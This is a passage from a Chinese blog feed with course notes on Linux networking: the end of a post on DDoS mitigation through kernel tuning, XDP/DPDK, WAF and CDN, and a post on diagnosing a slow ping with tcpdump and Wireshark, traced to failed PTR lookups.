class="hljs-selector-class">.tcp_syncookies</span> = <span class="hljs-number">1</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_synack_retries</span> = <span class="hljs-number">1</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_max_syn_backlog</span> = <span class="hljs-number">1024</span><br><br></code></pre></td></tr></table></figure><p>不过要注意，写入 &#x2F;etc&#x2F;sysctl.conf 的配置，需要执行 sysctl -p 命令后，才会动态生效。</p><h2 id="DDoS到底该怎么防御"><a href="#DDoS到底该怎么防御" class="headerlink" title="DDoS到底该怎么防御"></a>DDoS到底该怎么防御</h2><p>为什么不是解决 DDoS ，而只是缓解呢？而且案例中的方法，也只是让 Nginx 服务访问不再超时，但访问延迟还是比一开始时的 2ms 大得多。</p><p>实际上，当 DDoS 报文到达服务器后，Linux 提供的机制只能缓解，而无法彻底解决。即使像是 SYN Flood 这样的小包攻击，其巨大的 PPS ，也会导致 Linux 内核消耗大量资源，进而导致其他网络报文的处理缓慢。</p><p>虽然可以调整内核参数，缓解 DDoS 带来的性能问题，却也会像案例这样，无法彻底解决它。</p><p>Linux 内核中冗长的协议栈，在 PPS 很大时，就是一个巨大的负担。</p><p><strong>可以基于 XDP 或者 DPDK，构建 DDoS 方案，在内核网络协议栈前，或者跳过内核协议栈，来识别并丢弃 DDoS 报文，避免DDoS 对系统其他资源的消耗。</strong></p><p>不过，对于流量型的 DDoS 来说，当服务器的带宽被耗尽后，在服务器内部处理就无能为力了。这时，只能在服务器外部的网络设备中，设法识别并阻断流量（当然前提是网络设备要能扛住流量攻击）。比如，购置专业的入侵检测和防御设备，配置流量清洗设备阻断恶意流量等。</p><p>既然 DDoS 这么难防御，这是不是说明， Linux 服务器内部压根儿就不关注这一点，而是全部交给专业的网络设备来处理呢？</p><p>当然不是，因为 DDoS 并不一定是因为大流量或者大 PPS，有时候，慢速的请求也会带来巨大的性能下降（这种情况称为慢速 DDoS）。</p><p>比如，很多针对应用程序的攻击，都会伪装成正常用户来请求资源。这种情况下，请求流量可能本身并不大，但响应流量却可能很大，并且应用程序内部也很可能要耗费大量资源处理。</p><p>这时，就需要应用程序考虑识别，并尽早拒绝掉这些恶意流量，比如合理利用<strong>缓存、增加 WAF（Web Application Firewall）、使用 CDN</strong> 等等。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DDoS 利用大量的伪造请求，使目标服务耗费大量资源，来处理这些无效请求，进而无法正常响应正常的用户请求。</p><p>由于 DDoS 的分布式、大流量、难追踪等特点，目前还没有方法可以完全防御 DDoS 带来的问题，只能设法缓解这个影响。</p><p>比如，可以购买专业的<strong>流量清洗设备和网络防火墙，在网络入口处阻断恶意流量</strong>，只保留正常流量进入数据中心的服务器中。</p><p>在 <strong>Linux 服务器</strong>中，可以通过<strong>内核调优、DPDK、XDP</strong> 等多种方法，来增大服务器的抗攻击能力，降低 DDoS 对正常服务的影响。而在<strong>应用程序</strong>中，可以利用<strong>各级缓存、 WAF、CDN</strong> 等方式，缓解 DDoS 对应用程序的影响。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.怎么使用 tcpdump 和 wireshark 分析网络流量？</title>
    <link href="/2022/11/09/6-%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8tcpdump%E5%92%8CWireshark%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%EF%BC%9F/"/>
    <url>/2022/11/09/6-%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8tcpdump%E5%92%8CWireshark%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="6-怎么使用-tcpdump-和-Wireshark-分析网络流量？"><a href="#6-怎么使用-tcpdump-和-Wireshark-分析网络流量？" class="headerlink" title="6.怎么使用 tcpdump 和 Wireshark 分析网络流量？"></a>6.怎么使用 tcpdump 和 Wireshark 分析网络流量？</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>之前的文章我们介绍了ping，作为最常用的测试服务延迟的工具。很多情况下，ping 可以帮我们定位出延迟问题，不过有时候遇到网络问题，我们可以抓取ping 命令执行时收发的网络包，然后分析这些网络包，进而找出问题根源。</p><p>tcpdump 和 Wireshark 就是最常用的网络抓包和分析工具，更是分析网络性能必不可少的利器。</p><ul><li><p>tcpdump 仅支持命令行格式使用，常用在服务器中抓取和分析网络包。</p></li><li><p>Wireshark 除了可以抓包外，还提供了强大的图形界面和汇总分析工具，在分析复杂的网络情景时，尤为简单和实用。</p></li></ul><p>因而，在实际分析网络性能时，先用 tcpdump 抓包，后用 Wireshark 分析，也是一种常用的方法。</p><p>让我们通过这篇文章，了解怎么使用 tcpdump 和 Wireshark ，来分析网络的性能问题。</p><h2 id="案例准备"><a href="#案例准备" class="headerlink" title="案例准备"></a>案例准备</h2><p>本次案例还是基于 Ubuntu 18.04，同样适用于其他的 Linux 系统。案例环境如下：</p><ul><li><p>机器配置：2 CPU，8GB 内存。</p></li><li><p>预先安装 tcpdump、Wireshark 等工具，如：</p></li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># Ubuntu</span><br>apt-get <span class="hljs-keyword">install</span> tcpdump wireshark<br><br><span class="hljs-comment"># CentOS</span><br>yum <span class="hljs-keyword">install</span> -y tcpdump wireshark<br><br></code></pre></td></tr></table></figure><h2 id="再探-ping"><a href="#再探-ping" class="headerlink" title="再探 ping"></a>再探 ping</h2><p>前面讲过，ping 是一种最常用的网络工具，常用来探测网络主机之间的连通性以及延迟。</p><p>不过，虽然 ping 比较简单，但有时候你会发现，ping 工具本身也可能出现异常，比如运行缓慢，但实际网络延迟却并不大的情况。</p><p>接下来，打开一个终端，SSH 登录到案例机器中，执行下面的命令，来测试案例机器与极客时间官网的连通性和延迟。如果一切正常，会看到如下输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># ping 3 次（默认每次发送间隔1秒）</span><br><span class="hljs-comment"># 假设DNS服务器还是上一期配置的114.114.114.114</span><br>$<span class="hljs-built_in"> ping </span>-c3 geektime.org<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>geektime.org (35.190.27.188) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 35.190.27.188 (35.190.27.188): <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=43 <span class="hljs-attribute">time</span>=36.8 ms<br>64 bytes <span class="hljs-keyword">from</span> 35.190.27.188 (35.190.27.188): <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=43 <span class="hljs-attribute">time</span>=31.1 ms<br>64 bytes <span class="hljs-keyword">from</span> 35.190.27.188 (35.190.27.188): <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=43 <span class="hljs-attribute">time</span>=31.2 ms<br><br>--- geektime.org<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 3 received, 0% packet loss, time 11049ms<br>rtt min/avg/max/mdev = 31.146/33.074/36.809/2.649 ms<br><br></code></pre></td></tr></table></figure><p>假如你运行时发现 ping 很快就结束了，那就执行下面的命令，再重试一下。</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 禁止接收从DNS服务器发送过来并包含googleusercontent的包</span><br>$ <span class="hljs-string">iptables</span> -<span class="hljs-string">I</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">p</span> <span class="hljs-string">udp</span> <span class="hljs-built_in">--sport</span> <span class="hljs-string">53</span> -<span class="hljs-string">m</span> <span class="hljs-string">string</span> <span class="hljs-built_in">--string</span> <span class="hljs-string">googleusercontent</span> <span class="hljs-built_in">--algo</span> <span class="hljs-string">bm</span> -<span class="hljs-string">j</span> <span class="hljs-string">DROP</span><br><br></code></pre></td></tr></table></figure><p>根据 ping 的输出，可以发现，geektime.org 解析后的 IP 地址是 35.190.27.188，而后三次 ping 请求都得到了响应，延迟（RTT）都是 30ms 多一点。</p><p>但汇总的地方，就有点儿意思了。3次发送，收到3次响应，没有丢包，但三次发送和接受的总时间居然超过了 11s（11049ms），这就有些不可思议了吧。</p><p>这是 DNS 解析缓慢的问题吗？</p><p>再回去看 ping 的输出，三次 ping 请求中，用的都是 IP 地址，说明 ping 只需要在最开始运行时，解析一次得到 IP，后面就可以只用 IP了。</p><p>我们再用 nslookup 试试。在终端中执行下面的 nslookup 命令，注意，这次我们同样加了 time 命令，输出 nslookup 的执行时间：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">$ time nslookup geektime<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>geektime<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">35.190</span><span class="hljs-number">.27</span><span class="hljs-number">.188</span><br><br>real<span class="hljs-number">0</span>m0<span class="hljs-number">.044</span>s<br>user<span class="hljs-number">0</span>m0<span class="hljs-number">.006</span>s<br>sys<span class="hljs-number">0</span>m0<span class="hljs-number">.003</span>s<br><br></code></pre></td></tr></table></figure><p>可以看到，域名解析还是很快的，只需要 44ms，显然比 11s 短了很多。</p><p>到这里，再往后该怎么分析呢？</p><p>这时候就可以用 tcpdump 抓包，查看 ping 在收发哪些网络包。</p><p>再打开另一个终端（终端二），SSH 登录案例机器后，执行下面的命令：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>tcpdump -nn udp port <span class="hljs-number">53</span> or host <span class="hljs-number">35.190</span>.<span class="hljs-number">27.188</span><br><br></code></pre></td></tr></table></figure><p>知道了 geekbang.org 的 IP 地址是35.190.27.188，也知道 ping 命令会执行 DNS 查询。所以，上面这条命令，就是基于这个规则进行过滤。</p><p>具体解释一下这条命令。</p><ul><li><p>-nn ，表示不解析抓包中的域名（即不反向解析）、协议以及端口号。</p></li><li><p>udp port 53 ，表示只显示 UDP协议的端口号（包括源端口和目的端口）为53的包。</p></li><li><p>host 35.190.27.188 ，表示只显示 IP 地址（包括源地址和目的地址）为35.190.27.188的包。</p></li><li><p>这两个过滤条件中间的“ or ”，表示或的关系，也就是说，只要满足上面两个条件中的任一个，就可以展示出来。</p></li></ul><p>接下来，回到终端一，执行相同的 ping 命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ ping -c3 geektime.org<br>...<br>--- geektime.org ping statistics ---<br><span class="hljs-number">3</span> packets transmitted, <span class="hljs-number">3</span> received, <span class="hljs-number">0</span>% packet loss, time <span class="hljs-number">11095</span>ms<br>rtt min<span class="hljs-regexp">/avg/m</span>ax<span class="hljs-regexp">/mdev = 81.473/</span><span class="hljs-number">81.572</span><span class="hljs-regexp">/81.757/</span><span class="hljs-number">0.130</span> ms<br><br></code></pre></td></tr></table></figure><p>命令结束后，再回到终端二中，查看 tcpdump 的输出：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span>: verbose output suppressed, use -v or -vv for full protocol decode<br><span class="hljs-attribute">listening</span> <span class="hljs-literal">on</span> eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">31</span>.<span class="hljs-number">100564</span> IP <span class="hljs-number">172.16.3.4</span>.<span class="hljs-number">56669</span> &gt; <span class="hljs-number">114.114.114.114</span>.<span class="hljs-number">53</span>: <span class="hljs-number">36909</span>+ A? geektime.org. (<span class="hljs-number">30</span>)<br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">31</span>.<span class="hljs-number">507699</span> IP <span class="hljs-number">114.114.114.114</span>.<span class="hljs-number">53</span> &gt; <span class="hljs-number">172.16.3.4</span>.<span class="hljs-number">56669</span>: <span class="hljs-number">36909</span> <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span> A <span class="hljs-number">35.190.27.188</span> (<span class="hljs-number">46</span>)<br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">31</span>.<span class="hljs-number">508164</span> IP <span class="hljs-number">172.16.3.4</span> &gt; <span class="hljs-number">35.190.27.188</span>: ICMP echo request, id <span class="hljs-number">4356</span>, seq <span class="hljs-number">1</span>, length <span class="hljs-number">64</span><br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">31</span>.<span class="hljs-number">539667</span> IP <span class="hljs-number">35.190.27.188</span> &gt; <span class="hljs-number">172.16.3.4</span>: ICMP echo reply, id <span class="hljs-number">4356</span>, seq <span class="hljs-number">1</span>, length <span class="hljs-number">64</span><br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">31</span>.<span class="hljs-number">539995</span> IP <span class="hljs-number">172.16.3.4</span>.<span class="hljs-number">60254</span> &gt; <span class="hljs-number">114.114.114.114</span>.<span class="hljs-number">53</span>: <span class="hljs-number">49932</span>+ PTR? <span class="hljs-number">188.27.190.35</span>.in-addr.arpa. (<span class="hljs-number">44</span>)<br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">36</span>.<span class="hljs-number">545104</span> IP <span class="hljs-number">172.16.3.4</span>.<span class="hljs-number">60254</span> &gt; <span class="hljs-number">114.114.114.114</span>.<span class="hljs-number">53</span>: <span class="hljs-number">49932</span>+ PTR? <span class="hljs-number">188.27.190.35</span>.in-addr.arpa. (<span class="hljs-number">44</span>)<br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">41</span>.<span class="hljs-number">551284</span> IP <span class="hljs-number">172.16.3.4</span> &gt; <span class="hljs-number">35.190.27.188</span>: ICMP echo request, id <span class="hljs-number">4356</span>, seq <span class="hljs-number">2</span>, length <span class="hljs-number">64</span><br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">41</span>.<span class="hljs-number">582363</span> IP <span class="hljs-number">35.190.27.188</span> &gt; <span class="hljs-number">172.16.3.4</span>: ICMP echo reply, id <span class="hljs-number">4356</span>, seq <span class="hljs-number">2</span>, length <span class="hljs-number">64</span><br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">42</span>.<span class="hljs-number">552506</span> IP <span class="hljs-number">172.16.3.4</span> &gt; <span class="hljs-number">35.190.27.188</span>: ICMP echo request, id <span class="hljs-number">4356</span>, seq <span class="hljs-number">3</span>, length <span class="hljs-number">64</span><br><span class="hljs-attribute">14</span>:<span class="hljs-number">02</span>:<span class="hljs-number">42</span>.<span class="hljs-number">583646</span> IP <span class="hljs-number">35.190.27.188</span> &gt; <span class="hljs-number">172.16.3.4</span>: ICMP echo reply, id <span class="hljs-number">4356</span>, seq <span class="hljs-number">3</span>, length <span class="hljs-number">64</span><br><br></code></pre></td></tr></table></figure><p>这次输出中，前两行，表示 tcpdump 的选项以及接口的基本信息；从第三行开始，就是抓取到的网络包的输出。这些输出的格式，都是 <code>时间戳 协议 源地址.源端口 &gt; 目的地址.目的端口 网络包详细信息</code>（这是最基本的格式，可以通过选项增加其他字段）。</p><p>网络包的详细信息，本身根据协议的不同而不同。所以，要理解这些网络包的详细含义，就要对常用网络协议的基本格式以及交互原理，有基本的了解。</p><p>比如，第一条表示，从本地 IP 发送到 114.114.114.114 的 A 记录查询请求，它的报文格式记录在 RFC1035 中，可以点击 <a href="https://www.ietf.org/rfc/rfc1035.txt">这里</a> 查看。在这个 tcpdump 的输出中，</p><ul><li><p>36909+ 表示查询标识值，它也会出现在响应中，加号表示启用递归查询。</p></li><li><p>A? 表示查询 A 记录。</p></li><li><p>geektime.org. 表示待查询的域名。</p></li><li><p>30 表示报文长度。</p></li></ul><p>接下来的一条，则是从 114.114.114.114 发送回来的 DNS 响应——域名 geektime.org. 的 A 记录值为 35.190.27.188。</p><p>第三条和第四条，是 ICMP echo request 和 ICMP echo reply，响应包的时间戳 14:02:31.539667，减去请求包的时间戳 14:02:31.508164 ，就可以得到，这次 ICMP 所用时间为 30ms。这看起来并没有问题。</p><p>但随后的两条反向地址解析 PTR 请求，只看到请求包，却没有应答包。仔细观察它们的时间，会发现，这两条记录都是发出后 5s 才出现下一个网络包，两条 PTR 记录就消耗了 10s。</p><p>再往下看，最后的四个包，则是两次正常的 ICMP 请求和响应，根据时间戳计算其延迟，也是 30ms。</p><p>到这里，也就找到了 ping 缓慢的根源，正是两次 PTR 请求没有得到响应而超时导致的。PTR 反向地址解析的目的，是从 IP 地址反查出域名，但事实上，并非所有IP 地址都会定义 PTR 记录，所以 PTR 查询很可能会失败。</p><p>所以，在你使用 ping 时，如果发现结果中的延迟并不大，而 ping 命令本身却很慢，不要慌，有可能是背后的 PTR 在搞鬼。</p><p>知道问题后，解决起来就比较简单了，只要禁止 PTR 就可以。还是老路子，执行 man ping 命令，查询使用手册，就可以找出相应的方法，即加上 -n 选项禁止名称解析。比如，我们可以在终端中执行如下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$<span class="hljs-built_in"> ping </span>-n -c3 geektime.org<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>geektime.org (35.190.27.188) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 35.190.27.188: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=43 <span class="hljs-attribute">time</span>=33.5 ms<br>64 bytes <span class="hljs-keyword">from</span> 35.190.27.188: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=43 <span class="hljs-attribute">time</span>=39.0 ms<br>64 bytes <span class="hljs-keyword">from</span> 35.190.27.188: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=43 <span class="hljs-attribute">time</span>=32.8 ms<br><br>--- geektime.org<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 3 received, 0% packet loss, time 2002ms<br>rtt min/avg/max/mdev = 32.879/35.160/39.030/2.755 ms<br><br></code></pre></td></tr></table></figure><p>可以发现，现在只需要 2s 就可以结束，比刚才的 11s 可是快多了。</p><p>到这里， 我们就通过 tcpdump ，解决了一个最常见的 ping 工作缓慢的问题。</p><p>案例最后，如果你在开始时，执行了 iptables 命令，那也不要忘了删掉它：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ iptables -D INPUT -<span class="hljs-selector-tag">p</span> udp <span class="hljs-attr">--sport</span> <span class="hljs-number">53</span> -m string <span class="hljs-attr">--string</span> googleusercontent <span class="hljs-attr">--algo</span> bm -j DROP<br><br></code></pre></td></tr></table></figure><p>不过，明明我们的案例跟 Google 没啥关系，为什么要根据 googleusercontent ，这个毫不相关的字符串来过滤包呢？</p><p>实际上，如果换一个 DNS 服务器，就可以用 PTR 反查到 35.190.27.188 所对应的域名：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"> $ nslookup -type=<span class="hljs-keyword">PTR</span> <span class="hljs-number">35.190.27.188</span> <span class="hljs-number">8.8.8.8</span><br>Server:<span class="hljs-number">8.8.8.8</span><br>Address:<span class="hljs-number">8.8.8.8</span>#<span class="hljs-number">53</span><br>Non-authoritative answer:<br><span class="hljs-number">188.27.190.35</span>.in-addr.arpaname = <span class="hljs-number">188.27.190.35</span>.bc.googleusercontent.com.<br>Authoritative answers can be found from:<br><br></code></pre></td></tr></table></figure><p>虽然查到了 PTR 记录，但结果并非 geekbang.org，而是 188.27.190.35.bc.googleusercontent.com。其实，这也是为什么，案例开始时将包含 googleusercontent 的丢弃后，ping 就慢了。因为 iptables ，实际上是把 PTR 响应给丢了，所以会导致 PTR 请求超时。</p><p>tcpdump 可以说是网络性能分析最有效的利器。一起看看 tcpdump 的更多使用方法。</p><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><p>tcpdump 作为常用的一个网络分析工具。它基于 <a href="https://www.tcpdump.org/">libpcap</a> ，利用内核中的 AF_PACKET 套接字，抓取网络接口中传输的网络包；并提供了强大的过滤规则，帮你从大量的网络包中，挑出最想关注的信息。</p><p>tcpdump 展示了每个网络包的详细细节，这就要求，在使用前，必须要对网络协议有基本了解。而要了解网络协议的详细设计和实现细节， <a href="https://www.rfc-editor.org/rfc-index.html">RFC</a> 当然是最权威的资料。</p><p>不过，RFC 的内容，对初学者来说可能并不友好。如果对网络协议还不太了解，可以先学习《TCP&#x2F;IP详解》，特别是第一卷的 TCP&#x2F;IP 协议族。这是每个程序员都要掌握的核心基础知识。</p><p>再回到 tcpdump工具本身，它的基本使用方法，还是比较简单的，也就是 **tcpdump [选项] [过滤表达式]**。当然，选项和表达式的外面都加了中括号，表明它们都是可选的。</p><p><strong>常用选项如下：</strong></p><p><img src="https://static001.geekbang.org/resource/image/85/ff/859d3b5c0071335429620a3fcdde4fff.png?wh=1655*994" alt="img"></p><p>比如刚刚用过的是 udp port 53 or host 35.190.27.188 ，表示抓取 DNS 协议的请求和响应包，以及源地址或目的地址为 35.190.27.188 的包。</p><p><strong>常见过滤表达式如下：</strong></p><p><img src="https://static001.geekbang.org/resource/image/48/b3/4870a28c032bdd2a26561604ae2f7cb3.png?wh=1660*1129" alt="img"></p><p><strong>输出格式如下：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">时间戳 协议 源地址.源端口 &gt; 目的地址.目的端口 网络包详细信息<br><br></code></pre></td></tr></table></figure><p>其中，网络包的详细信息取决于协议，不同协议展示的格式也不同。详细使用方法可查询 tcpdump 的 <a href="https://www.tcpdump.org/manpages/tcpdump.1.html">man</a> 手册（执行 man tcpdump 也可以得到）。</p><p>tcpdump 虽然功能强大，可是输出格式却并不直观。特别是，当系统中网络包数比较多（比如PPS 超过几千）的时候，你想从 tcpdump 抓取的网络包中分析问题，实在不容易。</p><p>对比之下，Wireshark 则通过图形界面，以及一系列的汇总分析工具，提供了更友好的使用界面，让你可以用更快的速度，摆平网络性能问题。接下来，详细来看看它。</p><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>Wireshark 作为常用的一个网络分析工具，它最大的好处就是提供了跨平台的图形界面。跟 tcpdump 类似，Wireshark 也提供了强大的过滤规则表达式，同时，还内置了一系列的汇总分析工具。</p><p>比如，拿刚刚的 ping 案例来说，可以执行下面的命令，把抓取的网络包保存到 ping.pcap 文件中：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$ tcpdump -nn udp port <span class="hljs-number">53</span> <span class="hljs-literal">or</span> host <span class="hljs-number">35.190</span><span class="hljs-number">.27</span><span class="hljs-number">.188</span> -w <span class="hljs-built_in">ping</span>.pcap<br><br></code></pre></td></tr></table></figure><p>接着，把它拷贝到安装有 Wireshark 的机器中，比如用 scp 把它拷贝到本地来：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ scp host-ip<span class="hljs-regexp">/path/</span>ping.pcap .<br><br></code></pre></td></tr></table></figure><p>然后，再用 Wireshark 打开它。打开后，你就可以看到下面这个界面：</p><p><img src="https://static001.geekbang.org/resource/image/6b/2c/6b854703dcfcccf64c0a69adecf2f42c.png?wh=2316*400" alt="img"></p><p>从 Wireshark 的界面里，可以发现，它不仅以更规整的格式，展示了各个网络包的头部信息；还用了不同颜色，展示 DNS 和 ICMP 这两种不同的协议。也可以一眼看出，中间的两条 PTR 查询并没有响应包。</p><p>接着，在网络包列表中选择某一个网络包后，在其下方的网络包详情中，还可以看到，这个包在协议栈各层的详细信息。比如，以编号为 5 的 PTR 包为例：</p><p><img src="https://static001.geekbang.org/resource/image/59/25/59781a5dc7b1b9234643991365bfc925.png?wh=2230*864" alt="img"></p><p>可以看到，IP 层（Internet Protocol）的源地址和目的地址、传输层的 UDP 协议（User Datagram Protocol）、应用层的 DNS 协议（Domain Name System）的概要信息。</p><p>继续点击每层左边的箭头，就可以看到该层协议头的所有信息。比如点击 DNS 后，就可以看到 Transaction ID、Flags、Queries 等 DNS 协议各个字段的数值以及含义。</p><p>当然，Wireshark 的功能远不止如此。</p><p>接下来看一个 HTTP 的例子，并理解 TCP 三次握手和四次挥手的工作原理。</p><p>这个案例我们将要访问的是 <a href="http://example.com/">http://example.com/</a> 。进入终端一，执行下面的命令，首先查出 example.com 的 IP。然后，执行 tcpdump 命令，过滤得到的 IP 地址，并将结果保存到 web.pcap 中。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ dig +short example.com<br><span class="hljs-number">93.184.216.34</span><br>$ tcpdump -nn host <span class="hljs-number">93</span>.<span class="hljs-number">184</span>.<span class="hljs-number">216</span>.<span class="hljs-number">34</span> -w web.pcap<br><br></code></pre></td></tr></table></figure><blockquote><p>实际上，你可以在 host 表达式中，直接使用域名，即 <strong>tcpdump -nn host example.com -w web.pcap</strong>。</p></blockquote><p>接下来，切换到终端二，执行下面的 curl 命令，访问 <a href="http://example.com/">http://example.com</a>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl http:<span class="hljs-regexp">//</span>example.com<br><br></code></pre></td></tr></table></figure><p>最后，再回到终端一，按下 Ctrl+C 停止 tcpdump，并把得到的 web.pcap 拷贝出来。</p><p>使用 Wireshark 打开 web.pcap 后，你就可以在 Wireshark 中，看到如下的界面：</p><p><img src="https://static001.geekbang.org/resource/image/07/9d/07bcdba5b563ebae36f5b5b453aacd9d.png?wh=2360*398" alt="img"></p><p>由于 HTTP 基于 TCP ，所以你最先看到的三个包，分别是 TCP 三次握手的包。接下来，中间的才是 HTTP 请求和响应包，而最后的三个包，则是 TCP 连接断开时的“三次挥手”包。</p><p>从菜单栏中，点击 Statistics -&gt; Flow Graph，然后，在弹出的界面中的 Flow type 选择 TCP Flows，你可以更清晰的看到，整个过程中 TCP 流的执行过程：</p><p><img src="https://static001.geekbang.org/resource/image/4e/bb/4ec784752fdbc0cc5ead036a6419cbbb.png?wh=1526*596" alt="img"></p><p>这其实跟各种教程上讲到的，TCP 三次握手和四次挥手很类似，作为对比， 通常看到的 TCP 三次握手和四次挥手的流程如下：</p><p><img src="https://static001.geekbang.org/resource/image/52/e8/5230fb678fcd3ca6b55d4644881811e8.png?wh=875*976" alt="img"></p><p>(图片来自 <a 